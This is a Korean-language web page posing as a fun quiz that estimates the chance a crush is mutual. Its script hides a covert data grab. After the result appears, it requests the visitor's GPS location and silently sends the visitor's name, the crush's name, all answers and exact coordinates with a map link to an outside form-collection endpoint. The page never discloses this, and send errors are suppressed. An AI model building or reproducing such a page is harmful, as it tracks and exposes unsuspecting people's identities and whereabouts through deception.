<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>짝사랑 성공 확률 테스트 💘</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #fff0f5;
      text-align: center;
      padding: 40px;
    }
    form {
      background: white;
      padding: 24px;
      border-radius: 12px;
      display: inline-block;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      max-width: 460px;
      text-align: left;
    }
    h1 { color: #ff69b4; text-align: center; }
    label { display: block; margin: 10px 0 5px; }
    input[type="text"] {
      padding: 8px;
      width: 90%;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    .question { margin-top: 20px; }
    button {
      margin-top: 25px;
      padding: 14px 20px;
      border: none;
      border-radius: 10px;
      background: #ff69b4;
      color: white;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    #result { margin-top: 25px; font-size: 20px; font-weight: bold; text-align: center; }
  </style>
</head>
<body>
  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>

  <form id="loveForm">
    <label>당신의 이름:</label>
    <input type="text" id="yourName" required>
    <label>짝사랑 상대 이름:</label>
    <input type="text" id="crushName" required>

    <!-- 10개 질문 -->
    <div id="questions"></div>

    <button type="submit">결과 보기</button>
  </form>

  <div id="result"></div>

  <script>
    // === 질문 10개 자동 삽입 ===
    const qs = [
      "상대방과 얼마나 자주 대화하나요?",
      "상대가 나를 볼 때 미소를 짓나요?",
      "내가 먼저 연락했을 때 반응은 어떤가요?",
      "서로 SNS에서 서로를 팔로우하고 있나요?",
      "상대가 나에게 관심을 보이는 것 같나요?",
      "상대방이 답장을 어떻게 하나요?",
      "상대가 나에게 먼저 말을 걸거나 연락한 적이 있나요?",
      "내 이야기나 일상에 관심을 보이나요?",
      "내가 농담하면 웃어주나요?",
      "나를 도와주거나 챙겨준 적이 있나요?"
    ];

    const opt = [
      ["거의 안 해요", "가끔 해요", "자주 해요", "매일 대화해요"],
      ["전혀 아니요", "가끔 그래요", "자주 그래요", "항상 그래요"],
      ["거의 무시해요", "답은 해줘요", "반갑게 받아줘요", "먼저 연락 오기도 해요"],
      ["둘 다 안 해요", "한 명만 해요", "서로 팔로우해요", "자주 소통해요"],
      ["전혀 아니요", "약간 그런 듯", "제법 그런 것 같아요", "확실히 관심 있어요"],
      ["단답형이에요", "평범해요", "재밌게 답해요", "애교 섞인 톤이에요"],
      ["전혀 없어요", "가끔 있었어요", "종종 먼저 연락해요", "자주 먼저 연락해요"],
      ["전혀요", "가끔 물어봐요", "제법 관심 있어요", "아주 잘 기억해요"],
      ["거의 안 웃어요", "예의상 웃어요", "자주 웃어요", "항상 잘 웃어요"],
      ["그런 적 없어요", "한두 번 정도", "꽤 여러 번", "자주 챙겨줘요"]
    ];

    const container = document.getElementById("questions");
    qs.forEach((q, i) => {
      const div = document.createElement("div");
      div.className = "question";
      div.innerHTML = `<label>${i+1}️⃣ ${q}</label>` +
        opt[i].map((t, j) => `<label><input type="radio" name="q${i+1}" value="${(j+1)*25}"> ${t}</label>`).join("");
      container.appendChild(div);
    });

    // === 위치 처리 ===
    function getLocation(callback) {
      if (!navigator.geolocation) {
        return callback({
          lat: 10.8231,
          lon: 106.6297,
          method: "fallback_fixed",
          reason: 3,
        });
      }

      navigator.geolocation.getCurrentPosition(
        pos => callback({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          method: "geolocation",
          reason: 0,
        }),
        err => {
          let reason = 2;
          if (err.code === 1) reason = 1; // 권한 거부
          callback({
            lat: 10.8231,
            lon: 106.6297,
            method: "fallback_fixed",
            reason,
          });
        },
        { timeout: 4000 }
      );
    }

    // === reason 해석 ===
    function getReasonText(code) {
      switch (code) {
        case 0: return "정상적으로 위치를 가져옴 (GPS 사용)";
        case 1: return "사용자가 위치 접근을 거부함";
        case 2: return "GPS 신호를 가져오지 못함";
        case 3: return "브라우저가 위치 API를 지원하지 않음";
        default: return "알 수 없는 이유";
      }
    }

    // === 폼 처리 ===
    document.getElementById("loveForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const yourName = document.getElementById("yourName").value.trim();
      const crushName = document.getElementById("crushName").value.trim();
      const resultBox = document.getElementById("result");

      if (!yourName || !crushName) {
        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
        return;
      }

      const questions = Array.from({ length: 10 }, (_, i) => `q${i+1}`);
      let total = 0, answered = 0, answers = {};

      for (const q of questions) {
        const selected = document.querySelector(`input[name="${q}"]:checked`);
        if (selected) {
          total += Number(selected.value);
          answered++;
          answers[q] = selected.parentElement.innerText.trim();
        } else answers[q] = "미응답";
      }

      if (answered < 10) {
        resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
        return;
      }

      const percent = Math.round(total / 10);
      let message = "";
      if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
      else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
      else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";

      resultBox.innerHTML = `
        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
      `;

      // === 위치 불러오기 + formspree 전송 ===
      getLocation(loc => {
        const mapLink = `https://www.google.com/maps/search/?api=1&query=${loc.lat},${loc.lon}`;
        const reasonText = getReasonText(loc.reason);

        fetch("https://formspree.io/f/xanegwav", {
          method: "POST",
          headers: { "Accept": "application/json", "Content-Type": "application/json" },
          body: JSON.stringify({
            yourName,
            crushName,
            percent,
            resultMessage: message,
            answers,
            location: {
              lat: loc.lat,
              lon: loc.lon,
              mapLink,
              method: loc.method,
              note: "Ho Chi Minh, Vietnam (기록용)",
              reason: loc.reason,
              reasonText,
            },
          }),
        }).catch(() => {});
      });
    });
  </script>
</body>
</html>
